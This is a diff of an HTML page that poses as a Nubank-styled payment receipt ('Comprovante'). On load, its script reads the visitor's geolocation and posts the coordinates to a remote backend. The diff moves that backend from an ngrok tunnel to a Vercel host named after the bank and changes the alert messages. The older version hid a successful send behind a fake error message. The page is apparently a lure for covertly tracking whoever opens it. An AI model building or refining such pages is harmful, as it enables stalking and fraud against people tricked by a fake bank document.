@@ -6,14 +6,13 @@
 </head>
 <body style="background-color: #6B02A3">
   <img style="display: block; margin: 0 auto;" src="img/Com.jpg" alt="Comprovante" />
-
   <script>
-    // Executa automaticamente ao carregar a página
+    // Evento executado quando a página é carregada
     window.addEventListener("load", () => {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(sendLocation, handleError);
       } else {
-        alert("Algo deu errado. Tente novamente mais tarde.");
+        alert("Geolocalização não é suportada pelo navegador.");
       }
     });
 
@@ -25,28 +24,43 @@
       console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("https://99cf-2804-6950-9-67d1-287f-f39f-9cdf-cee1.ngrok-free.app/send-location", {
+      fetch("https://comprovantenubank-nunegocios.vercel.app/send-location", { // Substitua com o URL real do backend
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({ latitude, longitude })
       })
-      .then(response => response.json())
-      .then(data => {
-        if (data.success) {
-          alert("Algo deu errado. Tente novamente mais tarde.");
-        } else {
-          alert("Algo deu errado. Tente novamente mais tarde.");
+      .then(response => {
+        if (!response.ok) {
+          throw new Error("Erro ao enviar a localização.");
         }
+        return response.json();
+      })
+      .then(data => {
+        alert("Localização enviada com sucesso!");
       })
       .catch(error => {
         console.error("Erro:", error);
+        alert("Erro ao enviar a localização. Por favor, tente novamente.");
       });
     }
 
     function handleError(error) {
-      alert("Erro ao obter a localização: " + error.message);
+      switch (error.code) {
+        case error.PERMISSION_DENIED:
+          alert("O usuário negou a solicitação de geolocalização.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("As informações de localização não estão disponíveis.");
+          break;
+        case error.TIMEOUT:
+          alert("A solicitação de geolocalização expirou.");
+          break;
+        default:
+          alert("Ocorreu um erro desconhecido.");
+          break;
+      }
     }
   </script>
 </body>
